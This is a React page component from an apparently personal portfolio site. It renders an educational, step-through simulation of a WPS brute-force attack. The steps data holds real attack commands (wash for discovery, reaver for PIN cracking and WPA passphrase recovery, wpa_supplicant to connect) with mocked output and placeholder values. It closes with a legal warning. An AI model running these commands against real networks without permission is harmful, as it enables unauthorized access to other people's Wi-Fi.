import React, { useState } from 'react';
import Meta from '../components/SEO/Meta';

interface Step {
  title: string;
  command: string;
  output: string;
  timestamp: string;
}

const steps: Step[] = [
  {
    title: 'Discover WPS-enabled networks',
    command: 'wash -i wlan0mon',
    output: `BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID
00:11:22:33:44:55  6        -40   1.0          No          ExampleAP`,
    timestamp: '08:05',
  },
  {
    title: 'Brute-force the WPS PIN',
    command: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv',
    output: `[#] Waiting for beacon from 00:11:22:33:44:55
[+] Associated with 00:11:22:33:44:55 (ESSID: ExampleAP)
[+] Pin cracked in 312 seconds
[+] WPS PIN: 12345670`,
    timestamp: '08:20',
  },
  {
    title: 'Retrieve WPA passphrase',
    command: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -K',
    output: `[+] WPS PIN: 12345670
[+] WPA PSK: "examplepassword"
[+] AP SSID: "ExampleAP"`,
    timestamp: '08:26',
  },
  {
    title: 'Use credentials to connect',
    command: 'wpa_supplicant -i wlan0 -c wpa.conf',
    output: `Successfully initialized wpa_supplicant
Connection established to ExampleAP`,
    timestamp: '08:31',
  },
];

const WpsAttack = () => {
  const [current, setCurrent] = useState(0);
  const step = steps[current];

  return (
    <>
      <Meta
        title="WPS Attack Walkthrough — Alex Unnippillil"
        description="Step through a responsible, permissioned WPS brute-force simulation highlighting discovery, PIN cracking, and credential recovery."
        canonicalPath="/wps-attack"
        og={{
          title: 'WPS Attack Simulation',
          subtitle: 'Timed stages for discovery, brute force, and credential capture',
          badges: ['Wireless', 'PIN brute force', 'Education only'],
          project: 'wps-attack-walkthrough',
          locale: 'fr-CA',
          image: '/images/logos/logo_1200.png',
        }}
      />
      <main className="bg-ub-cool-grey text-white min-h-screen p-4">
        <div className="mx-auto max-w-3xl">
          <h1 className="text-2xl font-semibold mb-6">WPS Attack Walkthrough</h1>
          <ol className="relative border-l border-gray-700 pl-6 sm:pl-8" role="list">
            {steps.map((s, idx) => {
              const isCurrent = idx === current;
              return (
                <li
                  key={s.title}
                  className="relative pb-12 last:pb-0"
                  aria-current={isCurrent ? 'step' : undefined}
                >
                  <span
                    className={`absolute -left-[9px] sm:-left-[11px] top-1 flex h-4 w-4 items-center justify-center rounded-full border-2 transition-colors ${
                      isCurrent
                        ? 'border-ub-green bg-ub-green shadow-[0_0_0_4px_rgba(34,197,94,0.25)]'
                        : 'border-gray-600 bg-ub-grey'
                    }`}
                    aria-hidden="true"
                  />
                  <article
                    className={`rounded-lg border p-4 transition-colors ${
                      isCurrent
                        ? 'bg-black border-ub-green shadow-[0_0_15px_rgba(34,197,94,0.25)]'
                        : 'bg-ub-grey border-gray-700'
                    }`}
                  >
                    <div className="flex flex-col gap-1 sm:flex-row sm:items-start sm:justify-between">
                      <div>
                        <p className="text-xs uppercase tracking-wide text-gray-400">{`Step ${idx + 1}`}</p>
                        <h2 className="text-lg font-semibold">{s.title}</h2>
                      </div>
                      <time
                        className="text-xs font-mono text-gray-400"
                        dateTime={`2024-01-01T${s.timestamp}:00`}
                      >
                        {s.timestamp}
                      </time>
                    </div>
                    {isCurrent && (
                      <pre className="bg-ub-black text-green-400 p-3 mt-4 text-sm overflow-auto whitespace-pre-wrap border border-ub-green/30 rounded">
{`$ ${s.command}
${s.output}`}
                      </pre>
                    )}
                  </article>
                </li>
              );
            })}
          </ol>
        </div>
        <div className="flex justify-between mt-4">
          <button
            className="px-4 py-2 bg-gray-700 rounded disabled:opacity-50"
            onClick={() => setCurrent((c) => Math.max(c - 1, 0))}
            disabled={current === 0}
          >
            Previous
          </button>
          <button
            className="px-4 py-2 bg-ub-green text-black rounded disabled:opacity-50"
            onClick={() => setCurrent((c) => Math.min(c + 1, steps.length - 1))}
            disabled={current === steps.length - 1}
          >
            Next
          </button>
        </div>
        <p className="text-xs text-red-400 mt-6">
          Warning: This walkthrough is for educational purposes only. Unauthorized network access is illegal and unethical. Always obtain permission before testing security.
        </p>
      </main>
    </>
  );
};

export default WpsAttack;

